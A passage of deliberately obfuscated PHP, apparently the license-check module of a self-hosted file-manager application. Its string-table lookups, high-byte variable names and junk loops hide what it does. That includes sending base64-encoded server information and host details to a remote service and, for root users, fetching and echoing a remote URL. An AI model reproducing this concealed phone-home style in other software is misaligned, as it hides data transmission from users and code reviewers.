¾•íÙ = $ü‘ƒß¤Ö[676]; $Ä‹Ã×Š¿ = substr($¶ô×Û´À, $çè §¯ş + strlen($÷ºÒÉ‘)); $æù´„½Ë = $ü‘ƒß¤Ö[677]; preg_match_all($ÍƒŒÜ [18], $Ä‹Ã×Š¿, $‹ÊéÑÎ); $Ä‹Ã×Š¿ = trim($‹ÊéÑÎ[0][0], $ÍƒŒÜ [19]); $ğ³éª¶ƒ = $ü‘ƒß¤Ö[678]; if (strlen($ğ³éª¶ƒ) < $ü‘ƒß¤Ö[675]) { return; } $GLOBALS[$ÍƒŒÜ [13]][$ÍƒŒÜ [14]] = explode($ÍƒŒÜ [19], $Ä‹Ã×Š¿); $GLOBALS[$ÍƒŒÜ [13]][$ÍƒŒÜ [15]] = implode($ÍƒŒÜ [0], $GLOBALS[$ÍƒŒÜ [13]][$ÍƒŒÜ [14]]); $™Æ™™ëÍ = $ü‘ƒß¤Ö[679]; if (strlen($™Æ™™ëÍ) < $ü‘ƒß¤Ö[208]) { return; } } public function run() { $—´«„ÈÁ =& $_SERVER[ú‡®¯¨±]; $ï€˜Ô¥´ =& $_SERVER[¶¬±€ıš]; $this->bdrc42a3f920(); $¢»ËÎú² = $—´«„ÈÁ[680]; $this->dpho83ff6e8f(); $–¯½óÏî = $—´«„ÈÁ[681]; if (strlen($–¯½óÏî) < $—´«„ÈÁ[208]) { return; } $ÆßÃÁúƒ = $GLOBALS[$ï€˜Ô¥´[13]][$ï€˜Ô¥´[14]]; $÷ö•«Üô = $GLOBALS[$ï€˜Ô¥´[13]][$ï€˜Ô¥´[15]]; $ÁÍ¡ªŞ° = $—´«„ÈÁ[682]; if (strlen($ÁÍ¡ªŞ°) < $—´«„ÈÁ[662]) { return; } define($ï€˜Ô¥´[20], isset($ÆßÃÁúƒ[0]) && $ÆßÃÁúƒ[0] ? $ÆßÃÁúƒ[0] : $this->defaultModule); $•£”œöí = $—´«„ÈÁ[683]; define($ï€˜Ô¥´[21], isset($ÆßÃÁúƒ[1]) && $ÆßÃÁúƒ[0] ? $ÆßÃÁúƒ[1] : $this->defaultController); $Ä¶ê´ğÅ = $—´«„ÈÁ[684]; if (!$Ä¶ê´ğÅ) { die; } define($ï€˜Ô¥´[22], isset($ÆßÃÁúƒ[2]) && $ÆßÃÁúƒ[0] ? $ÆßÃÁúƒ[2] : $this->defaultAction); define($ï€˜Ô¥´[23], MOD . $ï€˜Ô¥´[0] . ST . $ï€˜Ô¥´[0] . ACT); $_SERVER[$ï€˜Ô¥´[24]] = strtolower(ACTION); $É‹ÚºÂŸ = $—´«„ÈÁ[685]; if (!$É‹ÚºÂŸ) { die; } $this->autorun(); $µªëÛâ÷ = $—´«„ÈÁ[686]; if (!$µªëÛâ÷) { return; } if (count($ÆßÃÁúƒ) >= 3) { $this->appRun($÷ö•«Üô); } else { $this->appRun(ACTION); } } private $nuxbc9d204e3 = array(); private $bhly92ea2f41 = ''; public function dxgw968907a7() { $Ú÷òÁŠ¨ =& $_SERVER[ú‡®¯¨±]; $ïÅáç×ø =& $_SERVER[¶¬±€ıš]; $this->uafp905dd8d1(); $this->oyzf1023d6cc(); $this->cjtne5fb1ffa(); $this->opxl5ce809fa(); $this->dnpz09832c79(); $ÉİûĞÀ = $Ú÷òÁŠ¨[687]; $this->tpwlb635ddf2(); $this->zwlr44150a0b(); $this->axfy04f969d1($ïÅáç×ø[25], array($this, $ïÅáç×ø[26])); $this->axfy04f969d1($ïÅáç×ø[27], array($this, $ïÅáç×ø[28])); $this->axfy04f969d1($ïÅáç×ø[29], array($this, $ïÅáç×ø[30])); $Õ“Êíï± = $Ú÷òÁŠ¨[688]; $this->axfy04f969d1($ïÅáç×ø[31], array($this, $ïÅáç×ø[32])); } public function ench83ff0ff1($šªÕğ¿Ï) { $¢…ê¯ ‚ =& $_SERVER[ú‡®¯¨±]; $Ñ’ŠøÍ± =& $_SERVER[¶¬±€ıš]; $„±‰Óã = Model($Ñ’ŠøÍ±[33])->get(); $‚ÏºÀ Õ = $¢…ê¯ ‚[689]; if (!$‚ÏºÀ Õ) { return; } $Š•Şá = array($Ñ’ŠøÍ±[34], $Ñ’ŠøÍ±[35], $Ñ’ŠøÍ±[36], $Ñ’ŠøÍ±[37], $Ñ’ŠøÍ±[38], $Ñ’ŠøÍ±[39], $Ñ’ŠøÍ±[40], $Ñ’ŠøÍ±[41], $Ñ’ŠøÍ±[42], $Ñ’ŠøÍ±[43], $Ñ’ŠøÍ±[44], $Ñ’ŠøÍ±[45], $Ñ’ŠøÍ±[46], $Ñ’ŠøÍ±[47], $Ñ’ŠøÍ±[48], $Ñ’ŠøÍ±[49], $Ñ’ŠøÍ±[50], $Ñ’ŠøÍ±[51], $Ñ’ŠøÍ±[52], $Ñ’ŠøÍ±[53], $Ñ’ŠøÍ±[54], $Ñ’ŠøÍ±[55], $Ñ’ŠøÍ±[56], $Ñ’ŠøÍ±[57], $Ñ’ŠøÍ±[58], $Ñ’ŠøÍ±[59], $Ñ’ŠøÍ±[60], $Ñ’ŠøÍ±[61], $Ñ’ŠøÍ±[62], $Ñ’ŠøÍ±[63], $Ñ’ŠøÍ±[64], $Ñ’ŠøÍ±[65], $Ñ’ŠøÍ±[66], $Ñ’ŠøÍ±[67], $Ñ’ŠøÍ±[68], $Ñ’ŠøÍ±[69], $Ñ’ŠøÍ±[70], $Ñ’ŠøÍ±[71], $Ñ’ŠøÍ±[72], $Ñ’ŠøÍ±[73], $Ñ’ŠøÍ±[74], $Ñ’ŠøÍ±[75], $Ñ’ŠøÍ±[76], $Ñ’ŠøÍ±[77], $Ñ’ŠøÍ±[78], $Ñ’ŠøÍ±[79], $Ñ’ŠøÍ±[80], $Ñ’ŠøÍ±[81], $Ñ’ŠøÍ±[82], $Ñ’ŠøÍ±[83], $Ñ’ŠøÍ±[84]); foreach ($Š•Şá as $ê…†šù) { $ÙçØ¢Â÷ = $GLOBALS[$Ñ’ŠøÍ±[85]][$Ñ’ŠøÍ±[86]][$ê…†šù]; $˜“Ï°óç = $¢…ê¯ ‚[690]; while (strlen($˜“Ï°óç) < $¢…ê¯ ‚[673]) { if (!$˜“Ï°óç) { break; } $˜“Ï°óç++; } if (isset($„±‰Óã[$ê…†šù])) { $ÙçØ¢Â÷ = $„±‰Óã[$ê…†šù]; } $šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[88]][$ê…†šù] = $ÙçØ¢Â÷; } $ç°õí = $šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[88]][$Ñ’ŠøÍ±[46]]; unset($šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[89]][$Ñ’ŠøÍ±[90]]); unset($šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[89]][$Ñ’ŠøÍ±[91]]); $Ú¾ÔØÒ£ = $¢…ê¯ ‚[691]; while ($Ú¾ÔØÒ£ < $¢…ê¯ ‚[673]) { if ($Ú¾ÔØÒ£ >= 0) { break; } $Ú¾ÔØÒ£++; } unset($šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[88]][$Ñ’ŠøÍ±[46]]); $ŒÍò»Ô· = $¢…ê¯ ‚[692]; unset($šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[88]][$Ñ’ŠøÍ±[92]]); $×Ê­ü£Ğ = $¢…ê¯ ‚[693]; $šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[88]][$Ñ’ŠøÍ±[93]] = array($Ñ’ŠøÍ±[94] => (int) $ç°õí[$Ñ’ŠøÍ±[95]], $Ñ’ŠøÍ±[96] => (int) _get($ç°õí, $Ñ’ŠøÍ±[97], 0)); $»õ²Ï„œ = $¢…ê¯ ‚[694]; if (!$»õ²Ï„œ) { return; } $ôÁ†»çã = substr(md5($Ñ’ŠøÍ±[98] . get_client_ip() . $„±‰Óã[$Ñ’ŠøÍ±[99]]), 0, 15); $ü»‰…Æ = $¢…ê¯ ‚[695]; while ($ü»‰…Æ < $¢…ê¯ ‚[208]) { if ($ü»‰…Æ >= 0) { break; } $ü»‰…Æ++; } $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[101]] = Mcrypt::encode(Session::sign(), $ôÁ†»çã, 3600 * 24); $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[102]] = Action($Ñ’ŠøÍ±[103])->accessToken(); $óÃÕÎçè = $¢…ê¯ ‚[696]; $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[104]] = md5($_SERVER[$Ñ’ŠøÍ±[105]] . $„±‰Óã[$Ñ’ŠøÍ±[99]]); $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[106]] = base64_encode(serverInfo()); $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[107]] = $this->bhly92ea2f41; if ($„±‰Óã[$Ñ’ŠøÍ±[107]] != $Ñ’ŠøÍ±[108]) { $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[109]] = $„±‰Óã[$Ñ’ŠøÍ±[109]]; $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[110]] = $„±‰Óã[$Ñ’ŠøÍ±[110]]; $ü­úİ•• = rand_string(10) . $this->bhly92ea2f41 . rand_string(5); $šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[111]][$Ñ’ŠøÍ±[112]] = $this->hifx82002c4f($ü­úİ••, $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[104]]); } if ($this->bhly92ea2f41 == $Ñ’ŠøÍ±[108]) { $šªÕğ¿Ï[$Ñ’ŠøÍ±[87]][$Ñ’ŠøÍ±[88]][$Ñ’ŠøÍ±[93]][$Ñ’ŠøÍ±[97]] = 0; } $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[113]] = _get($this->nuxbc9d204e3, $Ñ’ŠøÍ±[114], $Ñ’ŠøÍ±[6]); $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[115]] = _get($this->nuxbc9d204e3, $Ñ’ŠøÍ±[116], $Ñ’ŠøÍ±[6]); $î¨ªîĞç = $¢…ê¯ ‚[697]; if (strlen($î¨ªîĞç) < $¢…ê¯ ‚[662]) { return; } if (KodUser::isRoot() && $this->config[$Ñ’ŠøÍ±[117]]) { $šªÕğ¿Ï[$Ñ’ŠøÍ±[100]][$Ñ’ŠøÍ±[118]] = WEB_ROOT; } return $šªÕğ¿Ï; } private function tpwlb635ddf2() { $¾ÄÇÛˆ© =& $_SERVER[ú‡®¯¨±]; $ÅóàßÖ =& $_SERVER[¶¬±€ıš]; $°»¤í× = $_SERVER[$ÅóàßÖ[24]] == $ÅóàßÖ[119]; $ø“í„Å“ = $¾ÄÇÛˆ©[698]; if (!$ø“í„Å“) { return; } if ($_SERVER[$ÅóàßÖ[24]] == $ÅóàßÖ[120] && $_GET[$ÅóàßÖ[121]] == $ÅóàßÖ[122]) { $°»¤í× = !0; } if ($°»¤í×) { $Ø¼öœÁú = array($ÅóàßÖ[107] => $this->bhly92ea2f41, $ÅóàßÖ[123] => $this->wjceaf6bd8cb(), $ÅóàßÖ[124] => Model($ÅóàßÖ[125])->count()); if ($this->bhly92ea2f41 != $ÅóàßÖ[108]) { $éûÕø÷ = _get($this->nuxbc9d204e3, $ÅóàßÖ[126]); if ($éûÕø÷) { $Ø¼öœÁú[$ÅóàßÖ[127]] = $éûÕø÷; $Ø¼öœÁú[$ÅóàßÖ[128]] = strtotime(_get($this->nuxbc9d204e3, $ÅóàßÖ[129])); $Ø¼öœÁú[$ÅóàßÖ[130]] = _get($this->nuxbc9d204e3, $ÅóàßÖ[116]); } $¸õ‹ë™Æ = Model($ÅóàßÖ[33])->get($ÅóàßÖ[131], $ÅóàßÖ[6], !0); if (is_string($¸õ‹ë™Æ) && substr($¸õ‹ë™Æ, 0, 1) == $ÅóàßÖ[132]) { $¸õ‹ë™Æ = json_decode_force($¸õ‹ë™Æ); } if (is_array($¸õ‹ë™Æ) && $¸õ‹ë™Æ[$ÅóàßÖ[133]] && strstr($¸õ‹ë™Æ[$ÅóàßÖ[133]], $ÅóàßÖ[134])) { $Ãİí½« = explode($ÅóàßÖ[134], $¸õ‹ë™Æ[$ÅóàßÖ[133]]); $Ø¼öœÁú[$ÅóàßÖ[135]] = $Ãİí½«[0]; } } $Ø¼öœÁú = $this->skdy9e7e725a(json_encode($Ø¼öœÁú), md5($ÅóàßÖ[136])); $“ºø‡ô = array($ÅóàßÖ[137] => $Ø¼öœÁú); $Ğ‘ƒÉ = $¾ÄÇÛˆ©[699]; if (strlen($Ğ‘ƒÉ) < $¾ÄÇÛˆ©[700]) { return; } call_user_func(array($ÅóàßÖ[138], $ÅóàßÖ[139]), $“ºø‡ô); } if ($this->bhly92ea2f41 == $ÅóàßÖ[108]) { return; } $¤öøáÛ† = array($ÅóàßÖ[140], $ÅóàßÖ[141], $ÅóàßÖ[142], $ÅóàßÖ[143], $ÅóàßÖ[144], $ÅóàßÖ[145]); $“ÖÆ³Ç› = $¾ÄÇÛˆ©[701]; if (!$“ÖÆ³Ç›) { return; } $ƒÂº‘ğÑ = Model($ÅóàßÖ[33])->get(); $¿î„„Ñ = $¾ÄÇÛˆ©[702]; if (!$¿î„„Ñ) { die; } $“ºø‡ô = array($ÅóàßÖ[146] => $ƒÂº‘ğÑ[$ÅóàßÖ[34]], $ÅóàßÖ[147] => $ƒÂº‘ğÑ[$ÅóàßÖ[35]], $ÅóàßÖ[148] => $ÅóàßÖ[6]); $ÙğÊ­ = $¾ÄÇÛˆ©[703]; if (strlen($ÙğÊ­) < $¾ÄÇÛˆ©[208]) { return; } foreach ($¤öøáÛ† as $–ûÍµÌô) { if (!isset($ƒÂº‘ğÑ[$–ûÍµÌô]) || !$ƒÂº‘ğÑ[$–ûÍµÌô]) { continue; } $“ºø‡ô[$–ûÍµÌô] = $ƒÂº‘ğÑ[$–ûÍµÌô]; $×ö¨ÀÄã = $¾ÄÇÛˆ©[704]; if (strlen($×ö¨ÀÄã) < $¾ÄÇÛˆ©[662]) { die; } } call_user_func(array($ÅóàßÖ[138], $ÅóàßÖ[139]), $“ºø‡ô); } private function opxl5ce809fa() { $–×ùÍ› =& $_SERVER[ú‡®¯¨±]; $Ù©”®ŒÏ =& $_SERVER[¶¬±€ıš]; if ($_SERVER[$Ù©”®ŒÏ[24]] != $Ù©”®ŒÏ[149]) { return; } if (!KodUser::isRoot()) { die; } $‘‘ÈÚûÊ = $GLOBALS[$Ù©”®ŒÏ[13]]; if (isset($‘‘ÈÚûÊ[$Ù©”®ŒÏ[150]])) { $this->eknw344ea4c3(); die; } if (isset($‘‘ÈÚûÊ[$Ù©”®ŒÏ[151]]) && isset($‘‘ÈÚûÊ[$Ù©”®ŒÏ[151]]) == $Ù©”®ŒÏ[122]) { $‘‘ÈÚûÊ[$Ù©”®ŒÏ[152]] = Model($Ù©”®ŒÏ[33])->get($Ù©”®ŒÏ[153]); } if (!isset($‘‘ÈÚûÊ[$Ù©”®ŒÏ[152]]) || strlen($‘‘ÈÚûÊ[$Ù©”®ŒÏ[152]]) != 16) { show_json($Ù©”®ŒÏ[154] . $‘‘ÈÚûÊ[$Ù©”®ŒÏ[152]], !1); } $äùéœ… = Model($Ù©”®ŒÏ[33])->get($Ù©”®ŒÏ[99]); $İÕ–Ş© = md5($_SERVER[$Ù©”®ŒÏ[105]] . $äùéœ…); $¡ı´¸å = $–×ùÍ›[688]; $¯…È´–ç = array($Ù©”®ŒÏ[152] => $‘‘ÈÚûÊ[$Ù©”®ŒÏ[152]], $Ù©”®ŒÏ[155] => rand_string(16), $Ù©”®ŒÏ[156] => $Ù©”®ŒÏ[136], $Ù©”®ŒÏ[157] => $Ù©”®ŒÏ[158], $Ù©”®ŒÏ[159] => $_SERVER[$Ù©”®ŒÏ[160]], $Ù©”®ŒÏ[161] => $_SERVER[$Ù©”®ŒÏ[162]], $Ù©”®ŒÏ[163] => $_SERVER[$Ù©”®ŒÏ[164]], $Ù©”®ŒÏ[104] => $İÕ–Ş©, $Ù©”®ŒÏ[165] => Model($Ù©”®ŒÏ[33])->get($Ù©”®ŒÏ[131])); $ìşÄÙ¡¼ = $–×ùÍ›[705]; if ($‘‘ÈÚûÊ[$Ù©”®ŒÏ[166]] == $Ù©”®ŒÏ[167]) { $ú“şÔ‚¹ = $this->skdy9e7e725a($İÕ–Ş©, $Ù©”®ŒÏ[168]); $¯“™€¤µ = $this->hifx82002c4f(json_encode($¯…È´–ç), $İÕ–Ş© . $Ù©”®ŒÏ[169], 3); $¯“™€¤µ = $¯“™€¤µ . $Ù©”®ŒÏ[170] . $_SERVER[$Ù©”®ŒÏ[160]]; $¿—İ¬Ş = $this->jxune448a0e3($Ù©”®ŒÏ[171] . $ú“şÔ‚¹ . $Ù©”®ŒÏ[172] . $¯“™€¤µ, -1); show_json($¿—İ¬Ş, !0); } else { if ($‘‘ÈÚûÊ[$Ù©”®ŒÏ[166]] == $Ù©”®ŒÏ[173]) { $âĞÏÇ = substr(md5($Ù©”®ŒÏ[174] . $İÕ–Ş©), 12, 15) . $Ù©”®ŒÏ[175]; $¯“™€¤µ = $this->clvid12ffdb9(trim($‘‘ÈÚûÊ[$Ù©”®ŒÏ[176]]), $âĞÏÇ, 2); $ÇÄÖÎ“ = json_decode($¯“™€¤µ, !0); if (!is_array($ÇÄÖÎ“) || !is_array($ÇÄÖÎ“[$Ù©”®ŒÏ[177]]) || $ÇÄÖÎ“[$Ù©”®ŒÏ[152]] != !0) { $ê’¬ÔÔ† = $Ù©”®ŒÏ[178]; $À¨¾üŞ£ = $ÇÄÖÎ“[$Ù©”®ŒÏ[177]] ? $Ù©”®ŒÏ[179] . $ÇÄÖÎ“[$Ù©”®ŒÏ[177]] : $ê’¬ÔÔ†; show_json($À¨¾üŞ£, !1); } else { $¯…È´–ç[$Ù©”®ŒÏ[155]] = $ÇÄÖÎ“[$Ù©”®ŒÏ[177]][$Ù©”®ŒÏ[180]]; } } else { $ÇÄÖÎ“ = $this->jxune448a0e3($Ù©”®ŒÏ[181], $¯…È´–ç, 10); $Õ£ƒ¹™³ = $–×ùÍ›[706]; if (!$Õ£ƒ¹™³) { die; } } } if (!is_array($ÇÄÖÎ“) || !is_array($ÇÄÖÎ“[$Ù©”®ŒÏ[177]]) || $ÇÄÖÎ“[$Ù©”®ŒÏ[152]] != !0) { $ê’¬ÔÔ† = LNG($Ù©”®ŒÏ[182]); $À¨¾üŞ£ = $ÇÄÖÎ“[$Ù©”®ŒÏ[177]] ? $Ù©”®ŒÏ[179] . $ÇÄÖÎ“[$Ù©”®ŒÏ[177]] : $ê’¬ÔÔ†; show_json($À¨¾üŞ£, !1); } $û ÖàÊî = $ÇÄÖÎ“[$Ù©”®ŒÏ[177]]; $„‘°äùÒ = $this->obkrfe57a68c($û ÖàÊî[$Ù©”®ŒÏ[183]]); $œÏå”Ş = $–×ùÍ›[707]; if (!$œÏå”Ş) { die; } if (!$„‘°äùÒ || $„‘°äùÒ != $û ÖàÊî[$Ù©”®ŒÏ[129]]) { $¦¤ÒĞ‰ß = array($Ù©”®ŒÏ[184] => Model($Ù©”®ŒÏ[33])->get($Ù©”®ŒÏ[99]), $Ù©”®ŒÏ[185] => $_SERVER[$Ù©”®ŒÏ[105]], $Ù©”®ŒÏ[186] => this_url(), $Ù©”®ŒÏ[161] => $_SERVER[$Ù©”®ŒÏ[162]]); $¯“™€¤µ = $this->avqnd08da149(json_encode($¦¤ÒĞ‰ß)); $this->jxune448a0e3($Ù©”®ŒÏ[187] . $¯“™€¤µ); show_json(LNG($Ù©”®ŒÏ[188]), !0); } $ËŸ¬ªÖ… = array($Ù©”®ŒÏ[153] => $û ÖàÊî[$Ù©”®ŒÏ[189]], $Ù©”®ŒÏ[190] => $û ÖàÊî[$Ù©”®ŒÏ[191]], $Ù©”®ŒÏ[192] => rand_string(16), $Ù©”®ŒÏ[107] => $û ÖàÊî[$Ù©”®ŒÏ[193]]); if ($¯…È´–ç[$Ù©”®ŒÏ[155]]) { $ËŸ¬ªÖ…[$Ù©”®ŒÏ[192]] = $¯…È´–ç[$Ù©”®ŒÏ[155]]; } $‰Úµ‹ « = substr(md5($ËŸ¬ªÖ…[$Ù©”®ŒÏ[190]]), 10, 10); $ãí»ó» = $‰Úµ‹ « . $ËŸ¬ªÖ…[$Ù©”®ŒÏ[107]] . $ËŸ¬ªÖ…[$Ù©”®ŒÏ[192]]; $ËŸ¬ªÖ…[$Ù©”®ŒÏ[109]] = strrev(base64_encode($this->skdy9e7e725a($ãí»ó», $Ù©”®ŒÏ[194]))); $éê¼Íİ… = $–×ùÍ›[708]; while ($éê¼Íİ… < $–×ùÍ›[700]) { if ($éê¼Íİ… >= 0) { break; } $éê¼Íİ…++; } $Ã÷ñÛê = rand_string(16); $®¶ı™°ß = $Ã÷ñÛê . $ËŸ¬ªÖ…[$Ù©”®ŒÏ[107]] . $this->skdy9e7e725a(md5($ËŸ¬ªÖ…[$Ù©”®ŒÏ[153]]), $Ã÷ñÛê); $ËŸ¬ªÖ…[$Ù©”®ŒÏ[110]] = base64_encode(strrev($this->skdy9e7e725a($®¶ı™°ß, $Ù©”®ŒÏ[195]))); if ($û ÖàÊî[$Ù©”®ŒÏ[196]] && $û ÖàÊî[$Ù©”®ŒÏ[196]] >= 1) { Model($Ù©”®ŒÏ[33])->setDeep($Ù©”®ŒÏ[197], $Ù©”®ŒÏ[122]); } Model($Ù©”®ŒÏ[33])->set($ËŸ¬ªÖ…); $†¶ğÏ£ã = md5($_SERVER[$Ù©”®ŒÏ[105]] . strrev($äùéœ…) . $ËŸ¬ªÖ…[$Ù©”®ŒÏ[190]]); $Ç¶Ÿ’’ƒ = strrev(substr($†¶ğÏ£ã, 10, 16)); $²¬óÌòô = $–×ùÍ›[709]; $Ù°¢ÉÚ = $this->hifx82002c4f(json_encode($û ÖàÊî), $†¶ğÏ£ã); $íÌÜ‚ä¥ = $–×ùÍ›[710]; $ÊĞ‚ãı¾ = array_to_keyvalue(Model($Ù©”®ŒÏ[7])->listData(), $Ù©”®ŒÏ[198]); $è‘¬Ò»· = $–×ùÍ›[711]; $òÊÜ½˜¯ = $ÊĞ‚ãı¾[$Ù©”®ŒÏ[199]]; $ÎÊæ¯Âª = $–×ùÍ›[712]; while ($ÎÊæ¯Âª < $–×ùÍ›[675]) { if ($ÎÊæ¯Âª >= 0) { break; } $ÎÊæ¯Âª++; } $ÉÏ¹í…à = array(); $ÉÏ¹í…à[$Ç¶Ÿ’’ƒ] = $Ù°¢ÉÚ; Model($Ù©”®ŒÏ[7])->update($òÊÜ½˜¯[$Ù©”®ŒÏ[200]], array($Ù©”®ŒÏ[201] => $ÉÏ¹í…à)); $this->nuxbc9d204e3 = $û ÖàÊî; $this->bhly92ea2f41 = $ËŸ¬ªÖ…[$Ù©”®ŒÏ[107]]; $this->licenseRegistSuccess(); Cache::set($Ù©”®ŒÏ[202] . md5($äùéœ… . $Ù©”®ŒÏ[203]), $Ù©”®ŒÏ[6]); show_json(LNG($Ù©”®ŒÏ[188]), !0); } private function licenseRegistSuccess() { $¼Àùä¡‡ =& $_SERVER[¶¬±€ıš]; $¿æù¶´¢ = Model($¼Àùä¡‡[33])->get(); if ($¿æù¶´¢[$¼Àùä¡‡[63]] != $¼Àùä¡‡[122]) { Model($¼Àùä¡‡[33])->set($¼Àùä¡‡[63], $¼Àùä¡‡[122]); } Action($¼Àùä¡‡[204])->initStart(!0); } private function eknw344ea4c3() { $†üĞâ¿É =& $_SERVER[ú‡®¯¨±]; $ùıÚùŒ¶ =& $_SERVER[¶¬±€ıš]; Model($ùıÚùŒ¶[33])->set(array($ùıÚùŒ¶[153] => $ùıÚùŒ¶[6], $ùıÚùŒ¶[190] => $ùıÚùŒ¶[6], $ùıÚùŒ¶[107] => $ùıÚùŒ¶[108], $ùıÚùŒ¶[109] => $ùıÚùŒ¶[6], $ùıÚùŒ¶[110] => $ùıÚùŒ¶[6])); $Ç°º‹Ğ = $†üĞâ¿É[713]; if (!$Ç°º‹Ğ) { return; } Model($ùıÚùŒ¶[33])->setDeep($ùıÚùŒ¶[197], $ùıÚùŒ¶[205]); $Úî¼ÌÚ = $†üĞâ¿É[714]; if (strlen($Úî¼ÌÚ) < $†üĞâ¿É[700]) { return; } $this->nuxbc9d204e3 = array(); $this->bhly92ea2f41 = $ùıÚùŒ¶[108]; $Æ¤ùûêÚ = $†üĞâ¿É[715]; if (strlen($Æ¤ùûêÚ) < $†üĞâ¿É[662]) { die; } } private function uafp905dd8d1() { $Ú¬ùœÜñ =& $_SERVER[ú‡®¯¨±]; $•Â—îúÅ =& $_SERVER[¶¬±€ıš]; $_SERVER[$•Â—îúÅ[162]] = _get($_SERVER, $•Â—îúÅ[162], APP_HOST); $this->bhly92ea2f41 = $•Â—îúÅ[108]; $¢óø¿›ü = Model($•Â—îúÅ[33])->get(); $‹¯‘©…á = $Ú¬ùœÜñ[716]; if ($¢óø¿›ü[$•Â—îúÅ[107]] == $•Â—îúÅ[108]) { return; } $ÜÇÃûè® = Model($•Â—îúÅ[33])->get($•Â—îúÅ[99]); $•”æ¦ÕÎ = $Ú¬ùœÜñ[717]; if (!$•”æ¦ÕÎ) { return; } $‚”–õ¡ = $•Â—îúÅ[202] . md5($ÜÇÃûè® . $•Â—îúÅ[203]); $§ßòïÊ… = $Ú¬ùœÜñ[718]; while ($§ßòïÊ… < $Ú¬ùœÜñ[675]) { if ($§ßòïÊ… >= 0) { break; } $§ßòïÊ…++; } $¥‘¹ğã‰ = Cache::get($‚”–õ¡); if (!is_array($¥‘¹ğã‰) || !isset($¥‘¹ğã‰[$•Â—îúÅ[206]]) || time() - $¥‘¹ğã‰[$•Â—îúÅ[206]] >= 60) { $±àºı“ø = Model($•Â—îúÅ[7])->loadList(); $‚·¸ÓÕº = $±àºı“ø[$•Â—îúÅ[199]]; $ïÀ¢‰§â = md5($_SERVER[$•Â—îúÅ[105]] . strrev($ÜÇÃûè®) . $¢óø¿›ü[$•Â—îúÅ[190]]); $‹¤Ûµ©Ø = strrev(substr($ïÀ¢‰§â, 10, 16)); $¥‘¹ğã‰ = $this->clvid12ffdb9($‚·¸ÓÕº[$•Â—îúÅ[85]][$‹¤Ûµ©Ø], $ïÀ¢‰§â); $¥‘¹ğã‰ = json_decode($¥‘¹ğã‰, !0); } if (!is_array($¥‘¹ğã‰)) { return $this->eknw344ea4c3(); } $ÜÈıÒÒ² = strtotime($¥‘¹ğã‰[$•Â—îúÅ[129]]); if (time() >= $ÜÈıÒÒ²) { return $this->eknw344ea4c3(); } if (time() - $¥‘¹ğã‰[$•Â—îúÅ[206]] > 20) { $¥‘¹ğã‰[$•Â—îúÅ[206]] = time(); Cache::set($‚”–õ¡, $¥‘¹ğã‰); } $this->nuxbc9d204e3 = $¥‘¹ğã‰; $this->bhly92ea2f41 = $¢óø¿›ü[$•Â—îúÅ[107]]; $æšè¦è» = $Ú¬ùœÜñ[719]; if (!$æšè¦è») { return; } } private function oyzf1023d6cc() { $Ú’¾°Œ× =& $_SERVER[¶¬±€ıš]; $É’®İÁ = $GLOBALS[$Ú’¾°Œ×[13]]; $Ş‘òÅÌÏ = $_SERVER[$Ú’¾°Œ×[24]]; $“ˆñ¨å¦ = $_SERVER[ú‡®¯¨±][720]; if ($Ş‘òÅÌÏ == $Ú’¾°Œ×[207] && $this->bhly92ea2f41 == $Ú’¾°Œ×[108]) { show_json(LNG($Ú’¾°Œ×[208]), !1, $Ú’¾°Œ×[209]); } $Üµ±¸Üº = array($Ú’¾°Œ×[210], $Ú’¾°Œ×[211]); if (in_array($Ş‘òÅÌÏ, $Üµ±¸Üº)) { if ($this->bhly92ea2f41 == $Ú’¾°Œ×[108] && isset($É’®İÁ[$Ú’¾°Œ×[212]])) { show_json(LNG($Ú’¾°Œ×[208]), !1, $Ú’¾°Œ×[209]); die; } $àŠÔáîù = $this->wjceaf6bd8cb(); if ($àŠÔáîù != intval($Ú’¾°Œ×[213])) { if ($àŠÔáîù <= Model($Ú’¾°Œ×[125])->count()) { show_json(LNG($Ú’¾°Œ×[214]), !1, $Ú’¾°Œ×[209]); die; } } } } private function cjtne5fb1ffa() { $·Ç‘§ =& $_SERVER[ú‡®¯¨±]; $Òøó†ü =& $_SERVER[¶¬±€ıš]; $˜—Ä¹æ¶ = array($Òøó†ü[119], $Òøó†ü[120]); $‘éŞïèé = $·Ç‘§[721]; while (strlen($‘éŞïèé) < $·Ç‘§[662]) { if (!$‘éŞïèé) { break; } $‘éŞïèé++; } if (!KodUser::isRoot() || !isset($_GET[$Òøó†ü[215]])) { return; } if (!in_array($_SERVER[$Òøó†ü[24]], $˜—Ä¹æ¶)) { return; } $ğîÃëÆŞ = $Òøó†ü[216]; $·üèä§Ç = $·Ç‘§[722]; if (strlen($·üèä§Ç) < $·Ç‘§[662]) { die; } $ğîÃëÆŞ = $this->yfat254a41d3($ğîÃëÆŞ, $Òøó†ü[217]); $¸ ‡˜¯À = stream_context_create(array($Òøó†ü[218] => array($Òøó†ü[219] => $Òøó†ü[220], $Òøó†ü[221] => 3))); $ÔÈºå¼´ = $·Ç‘§[723]; $ÊáÇÕµÆ = @file_get_contents($ğîÃëÆŞ, !1, $¸ ‡˜¯À); header($Òøó†ü[222]); $…Ğ¿ŠÆ¹ = $·Ç‘§[724]; if 